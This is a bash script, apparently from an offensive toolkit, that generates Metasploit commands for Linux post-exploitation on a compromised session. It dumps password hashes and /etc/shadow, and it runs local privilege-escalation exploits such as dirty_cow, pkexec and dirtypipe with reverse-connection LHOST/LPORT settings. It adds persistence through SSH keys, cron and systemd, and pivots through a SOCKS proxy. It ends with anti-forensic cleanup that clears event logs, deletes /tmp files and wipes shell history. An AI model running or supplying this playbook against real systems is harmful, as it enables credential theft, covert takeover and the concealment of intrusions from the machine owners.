#!/usr/bin/env bash
# ==============================================================================
# LINUX POST-EXPLOITATION — Meterpreter commands & post modules
# Usage: bash linux_post.sh <SESSION_ID>
# ==============================================================================
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../../../lib/common.sh" 2>/dev/null || true
source "$SCRIPT_DIR/../../../lib/env.sh" 2>/dev/null || true
SESSION="${1:-}"; [[ -z "$SESSION" ]] && { echo "Usage: bash linux_post.sh <SESSION_ID>"; exit 1; }
IN_MSF=false; [[ "${MSF_CONSOLE:-}" == "1" ]] || [[ -n "${MSFCONSOLE_BIN:-}" ]] && IN_MSF=true
run_msf() { local m="$1"; shift; local c="use $m"; for a in "$@"; do c="$c; set $a"; done; c="$c; run"; echo "$c"; }
echo ""; echo "=== LINUX POST-EXPLOITATION — Session: $SESSION ==="; echo ""
echo -e "--- ${BLUE}System Info${NC} ---"
echo "  sysinfo; getuid; ps; ipconfig; route; arp -a; ifconfig -a; cat /etc/passwd; cat /etc/shadow 2>/dev/null"
$IN_MSF && run_msf "post/linux/gather/hashdump" "SESSION $SESSION"
$IN_MSF && run_msf "post/linux/gather/enum_users_history" "SESSION $SESSION"
$IN_MSF && run_msf "post/linux/gather/enum_configs" "SESSION $SESSION"
$IN_MSF && run_msf "post/linux/gather/checkvm" "SESSION $SESSION"
$IN_MSF && run_msf "post/linux/gather/enum_network" "SESSION $SESSION"
echo ""
echo -e "--- ${RED}Privilege Escalation${NC} ---"
echo "  run post/multi/recon/local_exploit_suggester"
echo ""
for pe in dirty_cow pkexec netfilter_priv_esc_ipv4 sudo_baron_samedit cve_2022_0847_dirtypipe; do
    if $IN_MSF; then run_msf "exploit/linux/local/$pe" "SESSION $SESSION" "LHOST <LHOST>" "LPORT <LPORT>"; fi
done
echo ""
echo -e "--- ${YELLOW}Persistence${NC} ---"
$IN_MSF && run_msf "post/linux/manage/sshkey_persistence" "SESSION $SESSION" "KEY_FILE <pubkey>"
$IN_MSF && run_msf "exploit/linux/local/cron_persistence" "SESSION $SESSION" "LHOST <LHOST>" "LPORT <LPORT>"
$IN_MSF && run_msf "exploit/linux/local/systemd_persistence" "SESSION $SESSION" "LHOST <LHOST>" "LPORT <LPORT>"
echo ""
echo -e "--- ${CYAN}Lateral Movement${NC} ---"
$IN_MSF && run_msf "post/multi/manage/autoroute" "SESSION $SESSION" "SUBNET <target_subnet>"
$IN_MSF && run_msf "auxiliary/server/socks_proxy" "SESSION $SESSION" "SRVPORT 1080"
echo "  proxychains ssh user@<target>"
echo ""
echo -e "--- ${GREEN}Cleanup${NC} ---"
echo "  clearev"
echo "  rm -f /tmp/*"
echo "  history -c; export HISTSIZE=0"
